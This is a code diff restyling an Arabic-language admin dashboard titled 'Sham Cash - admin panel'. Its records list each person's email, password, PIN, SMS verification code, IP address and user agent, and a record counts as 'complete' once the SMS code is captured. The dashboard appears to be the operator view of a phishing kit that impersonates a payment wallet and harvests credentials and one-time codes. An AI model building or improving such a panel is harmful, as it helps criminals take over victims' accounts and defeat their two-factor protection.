@@ -3,9 +3,9 @@ import { useQuery, useMutation } from "@tanstack/react-query";
 import { type CollectedData } from "@shared/schema";
 import { apiRequest, queryClient } from "@/lib/queryClient";
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Avatar, AvatarFallback } from "@/components/ui/avatar";
 import { Badge } from "@/components/ui/badge";
-import { LogOut, Eye, EyeOff, Users, CheckCircle2, XCircle } from "lucide-react";
+import { LogOut, Users, Mail, Lock, Hash, MessageSquare, Calendar, Globe } from "lucide-react";
 import { format } from "date-fns";
 import { ar } from "date-fns/locale";
 
@@ -59,47 +59,43 @@ export default function AdminDashboard() {
     return null;
   }
 
-  const HiddenField = ({ value, label }: { value: string; label: string }) => {
-    if (isAdmin) {
-      return (
-        <div className="space-y-1">
-          <div className="flex items-center gap-2">
-            <p className="text-sm text-muted-foreground">{label}:</p>
-            <Badge variant="secondary" className="text-xs">
-              <Eye className="w-3 h-3 ml-1" />
-              مدير فقط
-            </Badge>
-          </div>
-          <p className="text-sm font-mono bg-muted px-2 py-1 rounded">{value}</p>
-        </div>
-      );
-    }
-    return null;
+  // Generate avatar color based on email
+  const getAvatarColor = (email: string) => {
+    const colors = [
+      "bg-blue-500",
+      "bg-green-500",
+      "bg-yellow-500",
+      "bg-purple-500",
+      "bg-pink-500",
+      "bg-indigo-500",
+      "bg-red-500",
+      "bg-teal-500",
+    ];
+    const index = email.charCodeAt(0) % colors.length;
+    return colors[index];
   };
 
-  const VisibleField = ({ value, label }: { value: string; label: string }) => (
-    <div className="space-y-1">
-      <p className="text-sm text-muted-foreground">{label}:</p>
-      <p className="text-sm font-mono bg-muted px-2 py-1 rounded">{value}</p>
-    </div>
-  );
+  // Get initials from email
+  const getInitials = (email: string) => {
+    return email.charAt(0).toUpperCase();
+  };
 
   return (
     <div className="min-h-screen bg-background" dir="rtl">
-      <header className="border-b bg-card">
+      <header className="border-b bg-card sticky top-0 z-50">
         <div className="container mx-auto px-4 py-4 flex items-center justify-between">
           <div className="flex items-center gap-3">
             <Users className="w-6 h-6 text-primary" />
             <div>
-              <h1 className="text-xl font-bold">لوحة الإدارة</h1>
-              <p className="text-sm text-muted-foreground">
+              <h1 className="text-xl font-bold">شام كاش - لوحة الإدارة</h1>
+              <div className="text-sm text-muted-foreground flex items-center gap-2">
                 مرحباً، {admin.username}
                 {isAdmin && (
-                  <Badge variant="default" className="mr-2 text-xs">
+                  <Badge variant="default" className="text-xs">
                     مدير
                   </Badge>
                 )}
-              </p>
+              </div>
             </div>
           </div>
           <Button
@@ -113,127 +109,136 @@ export default function AdminDashboard() {
         </div>
       </header>
 
-      <main className="container mx-auto px-4 py-8">
-        <div className="mb-6 grid grid-cols-1 md:grid-cols-3 gap-4">
-          <Card>
-            <CardHeader className="pb-3">
-              <CardDescription>إجمالي السجلات</CardDescription>
-              <CardTitle className="text-3xl">{collectedData.length}</CardTitle>
-            </CardHeader>
-          </Card>
-          <Card>
-            <CardHeader className="pb-3">
-              <CardDescription>السجلات المكتملة</CardDescription>
-              <CardTitle className="text-3xl">
-                {collectedData.filter(d => d.smsCode).length}
-              </CardTitle>
-            </CardHeader>
-          </Card>
-          <Card>
-            <CardHeader className="pb-3">
-              <CardDescription>في انتظار التحقق</CardDescription>
-              <CardTitle className="text-3xl">
-                {collectedData.filter(d => !d.smsCode).length}
-              </CardTitle>
-            </CardHeader>
-          </Card>
+      <main className="container mx-auto px-4 py-6 max-w-4xl">
+        <div className="mb-6 flex items-center justify-between">
+          <h2 className="text-lg font-semibold text-muted-foreground">
+            {collectedData.length} سجل
+          </h2>
         </div>
 
-        {!isAdmin && (
-          <Card className="mb-6 bg-muted/50 border-muted">
-            <CardContent className="pt-6">
-              <div className="flex items-start gap-3">
-                <EyeOff className="w-5 h-5 text-muted-foreground mt-0.5" />
-                <div>
-                  <h3 className="font-semibold mb-1">وصول محدود</h3>
-                  <p className="text-sm text-muted-foreground">
-                    بعض المعلومات الحساسة مخفية. فقط المدير يمكنه الوصول إلى جميع البيانات.
-                  </p>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-        )}
+        {isLoading ? (
+          <div className="flex items-center justify-center py-12">
+            <p className="text-muted-foreground">جاري تحميل البيانات...</p>
+          </div>
+        ) : collectedData.length === 0 ? (
+          <div className="flex items-center justify-center py-12">
+            <p className="text-muted-foreground">لا توجد سجلات حتى الآن</p>
+          </div>
+        ) : (
+          <div className="space-y-3">
+            {collectedData.map((record) => (
+              <div
+                key={record.id}
+                data-testid={`card-collected-${record.id}`}
+                className="bg-card rounded-lg border p-4 hover-elevate active-elevate-2 transition-all"
+              >
+                <div className="flex gap-4">
+                  {/* Avatar */}
+                  <Avatar className={`w-12 h-12 ${getAvatarColor(record.email)} flex-shrink-0`}>
+                    <AvatarFallback className="text-white font-bold text-lg">
+                      {getInitials(record.email)}
+                    </AvatarFallback>
+                  </Avatar>
 
-        <div className="space-y-4">
-          <h2 className="text-2xl font-bold flex items-center gap-2">
-            <Users className="w-6 h-6" />
-            سجلات المستخدمين
-          </h2>
-
-          {isLoading ? (
-            <Card>
-              <CardContent className="py-12 text-center">
-                <p className="text-muted-foreground">جاري تحميل البيانات...</p>
-              </CardContent>
-            </Card>
-          ) : collectedData.length === 0 ? (
-            <Card>
-              <CardContent className="py-12 text-center">
-                <p className="text-muted-foreground">لا توجد سجلات حتى الآن</p>
-              </CardContent>
-            </Card>
-          ) : (
-            collectedData.map((record) => (
-              <Card key={record.id} data-testid={`card-collected-${record.id}`}>
-                <CardHeader>
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-3">
-                      <CardTitle className="text-lg">{record.email}</CardTitle>
-                      {record.smsCode ? (
-                        <Badge variant="default" className="gap-1">
-                          <CheckCircle2 className="w-3 h-3" />
+                  {/* Content */}
+                  <div className="flex-1 min-w-0">
+                    {/* Header */}
+                    <div className="flex items-start justify-between mb-2">
+                      <div className="flex-1 min-w-0">
+                        <h3 className="font-semibold text-base truncate">{record.email}</h3>
+                        <div className="flex items-center gap-2 mt-1">
+                          <span className="text-xs text-muted-foreground flex items-center gap-1">
+                            <Calendar className="w-3 h-3" />
+                            {format(new Date(record.createdAt), "dd MMM yyyy - HH:mm", { locale: ar })}
+                          </span>
+                        </div>
+                      </div>
+                      {record.smsCode && (
+                        <Badge variant="default" className="text-xs flex-shrink-0 mr-2">
                           مكتمل
-                        </Badge>
-                      ) : (
-                        <Badge variant="secondary" className="gap-1">
-                          <XCircle className="w-3 h-3" />
-                          في الانتظار
                         </Badge>
                       )}
                     </div>
-                    <CardDescription>
-                      {format(new Date(record.createdAt), "dd MMM yyyy - HH:mm", { locale: ar })}
-                    </CardDescription>
-                  </div>
-                </CardHeader>
-                <CardContent className="space-y-4">
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <VisibleField label="البريد الإلكتروني" value={record.email} />
-                    
-                    <HiddenField label="كلمة المرور" value={record.password} />
-                    
-                    <VisibleField label="رمز PIN" value={record.pin} />
-                    
-                    {record.smsCode && (
-                      <HiddenField label="كود SMS" value={record.smsCode} />
-                    )}
-                    
-                    {isAdmin && record.ipAddress && (
-                      <VisibleField label="عنوان IP" value={record.ipAddress} />
-                    )}
-                    
-                    {record.verifiedAt && (
-                      <VisibleField 
-                        label="تاريخ التحقق" 
-                        value={format(new Date(record.verifiedAt), "dd MMM yyyy - HH:mm", { locale: ar })}
-                      />
-                    )}
-                  </div>
 
-                  {isAdmin && record.userAgent && (
-                    <div className="pt-4 border-t">
-                      <p className="text-xs text-muted-foreground mb-1">معلومات المتصفح:</p>
-                      <p className="text-xs font-mono bg-muted px-2 py-1 rounded break-all">
-                        {record.userAgent}
-                      </p>
+                    {/* Message-like content */}
+                    <div className="bg-muted/50 rounded-lg p-3 space-y-2">
+                      {/* Email */}
+                      <div className="flex items-start gap-2 text-sm">
+                        <Mail className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
+                        <div className="flex-1 min-w-0">
+                          <span className="text-muted-foreground">الحساب:</span>
+                          <span className="mr-2 font-mono break-all">{record.email}</span>
+                        </div>
+                      </div>
+
+                      {/* Password - Admin only */}
+                      {isAdmin && record.password && (
+                        <div className="flex items-start gap-2 text-sm">
+                          <Lock className="w-4 h-4 text-amber-500 mt-0.5 flex-shrink-0" />
+                          <div className="flex-1 min-w-0">
+                            <span className="text-muted-foreground">كلمة المرور:</span>
+                            <span className="mr-2 font-mono break-all">{record.password}</span>
+                            <Badge variant="secondary" className="text-xs mr-2">
+                              مدير فقط
+                            </Badge>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* PIN */}
+                      <div className="flex items-start gap-2 text-sm">
+                        <Hash className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
+                        <div className="flex-1 min-w-0">
+                          <span className="text-muted-foreground">رمز PIN:</span>
+                          <span className="mr-2 font-mono">{record.pin}</span>
+                        </div>
+                      </div>
+
+                      {/* SMS Code - Admin only */}
+                      {isAdmin && record.smsCode && (
+                        <div className="flex items-start gap-2 text-sm">
+                          <MessageSquare className="w-4 h-4 text-amber-500 mt-0.5 flex-shrink-0" />
+                          <div className="flex-1 min-w-0">
+                            <span className="text-muted-foreground">كود SMS:</span>
+                            <span className="mr-2 font-mono">{record.smsCode}</span>
+                            <Badge variant="secondary" className="text-xs mr-2">
+                              مدير فقط
+                            </Badge>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* IP Address */}
+                      {record.ipAddress && (
+                        <div className="flex items-start gap-2 text-sm">
+                          <Globe className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
+                          <div className="flex-1 min-w-0">
+                            <span className="text-muted-foreground">IP:</span>
+                            <span className="mr-2 font-mono text-xs">{record.ipAddress}</span>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Verification time */}
+                      {record.verifiedAt && (
+                        <div className="text-xs text-muted-foreground pt-1 border-t">
+                          تم التحقق: {format(new Date(record.verifiedAt), "dd MMM yyyy - HH:mm", { locale: ar })}
+                        </div>
+                      )}
                     </div>
-                  )}
-                </CardContent>
-              </Card>
-            ))
-          )}
-        </div>
+
+                    {/* User Agent - Admin only */}
+                    {isAdmin && record.userAgent && (
+                      <div className="mt-2 text-xs text-muted-foreground truncate">
+                        {record.userAgent}
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </div>
+            ))}
+          </div>
+        )}
       </main>
     </div>
   );
